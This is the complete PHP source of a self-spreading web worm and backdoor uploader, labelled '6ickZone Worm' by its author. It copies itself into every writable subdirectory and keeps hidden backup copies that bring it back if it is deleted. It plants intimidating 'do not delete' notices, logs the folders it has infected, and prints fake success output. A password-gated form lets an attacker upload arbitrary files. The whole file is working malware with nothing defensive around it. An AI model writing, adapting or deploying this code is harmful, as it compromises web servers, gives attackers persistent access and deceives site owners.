<?php
/*
 * [6ickZone is Worm v2.3s —  Uploader]
 * by 0x6ick - t.me/Yungx6ick
 */

@set_time_limit(0);
@ini_set('display_errors', 0);
@error_reporting(0);

$_1 = basename(__FILE__);
$_2 = file_get_contents(__FILE__);
$_3 = '.syscore.php';
$_4 = '.6zsig';
$_5 = "NOTICE:\n\nThis file is monitored.\n\nDeleting it may trigger system lockdown or data corruption.\n\n- 6ickZone";
$_6 = __DIR__ . '/.spreadlog.txt';
$_7 = 0;
$_8 = "";
$_9 = 'letmein'; // ? 

// === Bckp i t exists
if (!file_exists(__DIR__ . '/' . $_3)) {
    @copy(__FILE__, __DIR__ . '/' . $_3);
}

// === Spread Function
function _z($_d, $_p, $_n, $_b, $_s, $_w, &$_c, &$_o) {
    $_l = @scandir($_d);
    if (!$_l) return;

    foreach ($_l as $_e) {
        if ($_e === '.' || $_e === '..') continue;
        $_f = $_d . DIRECTORY_SEPARATOR . $_e;

        if (is_dir($_f) && is_writable($_f)) {
            $_x = $_f . DIRECTORY_SEPARATOR . $_n;
            $_y = $_f . DIRECTORY_SEPARATOR . $_b;
            $_z = $_f . DIRECTORY_SEPARATOR . $_s;
            $_r = $_f . DIRECTORY_SEPARATOR . 'readme_dont_delete.txt';

            if (!file_exists($_x)) {
                @file_put_contents($_x, $_p);
                $_c++;
                $_o .= "[+] Spread to: $_x\n";
            }

            if (!file_exists($_y)) {
                @file_put_contents($_y, $_p);
                $_o .= "[~] Backup: $_y\n";
            }

            @file_put_contents($_z, "6ickZone Marked");
            @file_put_contents($_r, $_w);

            _z($_f, $_p, $_n, $_b, $_s, $_w, $_c, $_o);
        }
    }
}

// === Resurrection
if (!file_exists(__DIR__ . '/' . $_1) && file_exists(__DIR__ . '/' . $_3)) {
    @copy(__DIR__ . '/' . $_3, __DIR__ . '/' . $_1);
}

// === Execute Spread
_z(__DIR__, $_2, $_1, $_3, $_4, $_5, $_7, $_8);

// === Save log silently
@file_put_contents($_6, "== 6ickZone Spread Log ==\n\n$_8\n---\nTotal Folders Infected: $_7\n");

// === Uploader Triggered via ?up=letmein
if (isset($_GET['up']) && $_GET['up'] === $_9) {
    echo '<form method="post" enctype="multipart/form-data">
        <input type="file" name="f">
        <button>Upload</button>
    </form>';
    if (isset($_FILES['f'])) {
        move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']);
        echo "<p>Upload success: " . htmlspecialchars($_FILES['f']['name']) . "</p>";
    }
    exit;
}

// === Fake output
echo "<!-- update success -->";
?>
